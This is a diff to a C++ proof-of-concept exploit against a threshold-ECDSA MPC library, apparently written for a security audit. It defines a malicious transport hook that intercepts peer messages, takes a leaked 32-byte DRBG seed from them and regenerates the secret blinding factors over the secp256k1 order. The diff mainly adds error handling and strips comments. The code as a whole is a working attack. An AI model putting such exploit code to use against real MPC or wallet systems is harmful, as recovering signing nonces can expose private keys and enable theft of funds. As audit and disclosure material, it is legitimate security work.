@@ -24,6 +24,7 @@ PoC (Passive Transport Hook)
 #include <iostream>
 #include <vector>
 #include <cstring>
+#include <stdexcept>
 #include <mpc_core/api/tss_ecdsa.h>
 #include <mpc_core/internal/crypto/rng.h>
 
@@ -31,24 +32,43 @@ using namespace mpc_lib;
 
 class mal_transport final : public data_transport_i {
 public:
-    explicit mal_transport(std::shared_ptr<net_context_t> ctx) : ctx_(std::move(ctx)) {}
+    explicit mal_transport(std::shared_ptr<net_context_t> ctx) : ctx_(std::move(ctx)) {
+        if (!ctx_) {
+            throw std::invalid_argument("mal_transport: net_context_t must not be null");
+        }
+    }
     
     error_t receive_all(const std::vector<party_idx_t>& senders, std::vector<buf_t>& msgs) override {
         error_t rv = ctx_->receive_all(senders, msgs);
-        if (rv != SUCCESS) return rv;
+        if (rv != SUCCESS) {
+            std::cerr << "[!] receive_all failed with error code: " << rv << "\n";
+            return rv;
+        }
 
         for (size_t i = 0; i < msgs.size(); i++) {
             if (msgs[i].size() >= 32) {
+                if (msgs[i].data() == nullptr) {
+                    std::cerr << "[!] msg[" << i << "] has valid size but null data ptr\n";
+                    continue;
+                }
+
                 buf256_t seed;
-                std::memcpy(&seed, msgs[i].data(), 32); // grab the leaked seed
+                std::memcpy(&seed, msgs[i].data(), 32);
                 
-                // init malicious drbg
                 crypto::deterministic_rng_t atk_drbg(seed);
                 bn_t q = bn_t::from_hex("fffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141");
+                if (q.is_zero()) {
+                    std::cerr << "[!] Failed to parse secp256k1 order\n";
+                    return ERR_INTERNAL;
+                }
                 
-                // boom. generate the exact blinding factors
-                for(int t = 0; t < 2; t++) {
-                    std::cout << "[*] aragui99 Audit - Expected: " << atk_drbg.gen_bn(q).to_hex() << "\n";
+                for (int t = 0; t < 2; t++) {
+                    bn_t factor = atk_drbg.gen_bn(q);
+                    if (factor.is_zero()) {
+                        std::cerr << "[!] DRBG gen_bn returned zero at iteration " << t << "\n";
+                        return ERR_INTERNAL;
+                    }
+                    std::cout << "[*] aragui99 Audit - Expected: " << factor.to_hex() << "\n";
                 }
             }
         }
